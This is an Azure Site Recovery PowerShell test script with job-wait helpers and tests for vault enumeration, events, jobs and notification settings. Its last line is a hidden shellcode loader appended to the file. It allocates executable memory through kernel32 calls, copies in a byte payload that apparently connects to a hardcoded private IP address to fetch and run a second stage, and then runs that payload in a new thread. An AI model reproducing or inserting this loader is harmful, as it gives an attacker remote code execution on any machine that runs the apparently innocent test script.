
















$suffix="v2avm1"
$JobQueryWaitTimeInSeconds = 0
$PrimaryFabricName = "V2A-W2K12-400"
$PrimaryNetworkFriendlyName = "corp"
$RecoveryNetworkFriendlyName = "corp"
$NetworkMappingName = "corp96map"
$RecoveryPlanName = "RPSwag96" + $suffix
$policyName1 = "V2aTest" + $suffix
$policyName2 = "V2aTest"+ $suffix+"-failback"
$PrimaryProtectionContainerMapping = "pcmmapping" + $suffix
$reverseMapping = "reverseMap" + $suffix
$pcName = "V2A-W2K12-400"

$rpiName = "V2ATest-rpi-" + $suffix
$RecoveryAzureStorageAccountId = "/subscriptions/7c943c1b-5122-4097-90c8-861411bdd574/resourceGroups/canaryexproute/providers/Microsoft.Storage/storageAccounts/ev2teststorage" 
$RecoveryResourceGroupId  = "/subscriptions/7c943c1b-5122-4097-90c8-861411bdd574/resourceGroups/canaryexproute" 
$AzureVmNetworkId = "/subscriptions/7c943c1b-5122-4097-90c8-861411bdd574/resourceGroups/ERNetwork/providers/Microsoft.Network/virtualNetworks/ASRCanaryTestSub3-CORP-SEA-VNET-1"
$rpiNameNew = "V2ATest-CentOS6U7-400-new"
$vCenterIpOrHostName = "10.150.209.216"
$vCenterName = "BCDR"
$Subnet = "Subnet-1"

$piName = "v2avm1"
$vmIp = "10.150.208.125"


function WaitForJobCompletion
{ 
    param(
        [string] $JobId,
        [int] $JobQueryWaitTimeInSeconds = $JobQueryWaitTimeInSeconds
        )
        $isJobLeftForProcessing = $true;
        do
        {
            $Job = Get-AzRecoveryServicesAsrJob -Name $JobId
            $Job

            if($Job.State -eq "InProgress" -or $Job.State -eq "NotStarted")
            {
                $isJobLeftForProcessing = $true
            }
            else
            {
                $isJobLeftForProcessing = $false
            }

            if($isJobLeftForProcessing)
            {
                [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait($JobQueryWaitTimeInSeconds * 1000)
            }
        }While($isJobLeftForProcessing)
}


Function WaitForIRCompletion
{ 
    param(
        [PSObject] $VM,
        [int] $JobQueryWaitTimeInSeconds = $JobQueryWaitTimeInSeconds
        )
        $isProcessingLeft = $true
        $IRjobs = $null

        do
        {
            $IRjobs = Get-AzRecoveryServicesAsrJob -TargetObjectId $VM.Name | Sort-Object StartTime -Descending | select -First 4 | Where-Object{$_.JobType -eq "PrimaryIrCompletion" -or $_.JobType -eq "SecondaryIrCompletion"}
            if($IRjobs -eq $null -or $IRjobs.Count -lt 2)
            {
                $isProcessingLeft = $true
            }
            else
            {
                $isProcessingLeft = $false
            }

            if($isProcessingLeft)
            {
                [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait($JobQueryWaitTimeInSeconds * 1000)
            }
        }While($isProcessingLeft)

        $IRjobs
        WaitForJobCompletion -JobId $IRjobs[0].Name -JobQueryWaitTimeInSeconds $JobQueryWaitTimeInSeconds
        WaitForJobCompletion -JobId $IRjobs[1].Name -JobQueryWaitTimeInSeconds $JobQueryWaitTimeInSeconds
}


function Test-SiteRecoveryEnumerationTests
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    
    $vaults = Get-AzRecoveryServicesVault
    Assert-True { $vaults.Count -gt 0 }
    Assert-NotNull($vaults)
    foreach($vault in $vaults)
    {
        Assert-NotNull($vault.Name)
        Assert-NotNull($vault.ID)
    }

    
    $rsps = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrServicesProvider
    Assert-True { $rsps.Count -gt 0 }
    Assert-NotNull($rsps)
    foreach($rsp in $rsps)
    {
        Assert-NotNull($rsp.Name)
        Assert-NotNull($rsp.ID)
    }

    
    $protectionContainers = Get-AzRecoveryServicesAsrFabric | Get-AzRecoveryServicesAsrProtectionContainer
    Assert-True { $protectionContainers.Count -gt 0 }
    Assert-NotNull($protectionContainers)
    foreach($protectionContainer in $protectionContainers)
    {
        Assert-NotNull($protectionContainer.Name)
        Assert-NotNull($protectionContainer.ID)
    }
}


function Test-AsrEvent
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $Events = get-asrEvent
    Assert-NotNull($Events)

    $e = Get-AzRecoveryServicesAsrEvent -Name $Events[0].Name
    Assert-NotNull($e)
    Assert-NotNull($e.Name)
    Assert-NotNull($e.Description)
    Assert-NotNull($e.FabricId)
    Assert-NotNull($e.AffectedObjectFriendlyName)

    $e = Get-AzRecoveryServicesAsrEvent -Severity $Events[0].Severity
    Assert-NotNull($e)

    $e = Get-AzRecoveryServicesAsrEvent -EventType VmHealth
    Assert-NotNull($e)

    $e = Get-AzRecoveryServicesAsrEvent -EventType VmHealth -AffectedObjectFriendlyName $e[0].AffectedObjectFriendlyName
    Assert-NotNull($e)

    $e = Get-AzRecoveryServicesAsrEvent -EventType VmHealth -FabricId $e[0].FabricId
    Assert-NotNull($e)

     $e = Get-AzRecoveryServicesAsrEvent -ResourceId  $e[0].Id
    Assert-NotNull($e)

    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $e = Get-AzRecoveryServicesAsrEvent -Fabric $fabric
    Assert-NotNull($e)
    
    $e = Get-AzRecoveryServicesAsrEvent -AffectedObjectFriendlyName $Events[0].AffectedObjectFriendlyName
    Assert-NotNull($e)
    
    $e = Get-AzRecoveryServicesAsrEvent -StartTime "8/18/2017 2:05:00 AM"
    Assert-NotNull($e)

}



function Test-Job
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    
    $jobs =  Get-AzRecoveryServicesAsrJob
    Assert-NotNull($jobs)
    $job = $jobs[0]
    Assert-NotNull($job.name)
    Assert-NotNull($job.id)

    $job = Get-AzRecoveryServicesAsrJob -name $job.name

    Assert-NotNull($job.name)
    Assert-NotNull($job.id)

    $job = Get-AzRecoveryServicesAsrJob -job $job

    Assert-NotNull($job.name)
    Assert-NotNull($job.id)

    $jobList = Get-AzRecoveryServicesAsrJob -TargetObjectId $job.TargetObjectId

    Assert-NotNull($jobList)

    $jobList = Get-AzRecoveryServicesAsrJob -StartTime '2017-08-04T09:28:52.0000000Z' -EndTime '2017-08-10T14:20:50.0000000Z'
    Assert-NotNull($jobList)

    $jobList =  Get-AzRecoveryServicesAsrJob -State Succeeded
    Assert-NotNull($jobList)
}


function Test-NotificationSettings
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    
    $NotificationSettings = Set-AzRecoveryServicesAsrNotificationSetting -EnableEmailSubscriptionOwner -CustomEmailAddress "abcxxxx@microsft.com"
    Assert-NotNull($NotificationSettings)
    
    $NotificationSettings = Set-AzRecoveryServicesAsrNotificationSetting -DisableEmailToSubscriptionOwner -CustomEmailAddress "abcxxxx@microsft.com"
    Assert-NotNull($NotificationSettings)

    $NotificationSettings = Get-AzRecoveryServicesAsrNotificationSetting
    Assert-NotNull($NotificationSettings)
    Assert-NotNull($NotificationSettings.CustomEmailAddress)
    Assert-AreEqual -expected "abcxxxx@microsft.com" -actual $NotificationSettings.CustomEmailAddress
    Assert-NotNull($NotificationSettings.EmailSubscriptionOwner)
    Assert-NotNull($NotificationSettings.Locale)
    Set-AzRecoveryServicesAsrNotificationSetting -DisableNotification
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x83,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

